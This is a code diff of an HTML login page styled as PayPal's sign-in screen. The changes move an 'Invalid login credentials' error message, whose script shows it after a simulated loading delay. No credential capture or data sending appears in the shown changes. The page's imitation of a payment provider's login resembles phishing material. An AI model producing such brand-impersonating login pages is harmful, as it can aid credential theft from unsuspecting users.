@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Page</title>
     <style>
-        /* Updated CSS */
+        /* Existing CSS code */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -44,6 +44,14 @@
         .logo {
             width: 60px;
             margin-bottom: 20px;
+        }
+
+        .error-message {
+            display: none;
+            color: red;
+            font-size: 14px;
+            margin-bottom: 10px;
+            text-align: left;
         }
 
         .input-field {
@@ -164,19 +172,14 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
-        .error-message {
-            display: none;
-            color: red;
-            font-size: 14px;
-            margin-top: 10px;
-        }
     </style>
 </head>
 <body>
     <div class="login-container">
         <div class="login-box">
             <img src="paypal logo.webp" alt="PayPal Logo" class="logo">
+            <!-- Error message displayed above input fields -->
+            <div id="error-message" class="error-message">Error: Invalid login credentials</div>
             <form id="login-form">
                 <input type="text" placeholder="Email or mobile number" class="input-field">
                 <input type="password" placeholder="Password" class="input-field">
@@ -190,7 +193,6 @@
                 <span>English</span> | Français | Español | 中文
             </div>
             <div id="loading-spinner" class="loading-spinner"></div>
-            <div id="error-message" class="error-message">Error: Invalid login credentials</div>
         </div>
     </div>
 
@@ -208,11 +210,11 @@
             const spinner = document.getElementById('loading-spinner');
             const errorMessage = document.getElementById('error-message');
             const loginButton = document.getElementById('login-btn');
-
+            
             spinner.style.display = 'block';
             errorMessage.style.display = 'none';
             loginButton.disabled = true;
-
+            
             // Simulate a delay to show the loading spinner
             setTimeout(function() {
                 // Hide loading spinner and show error message
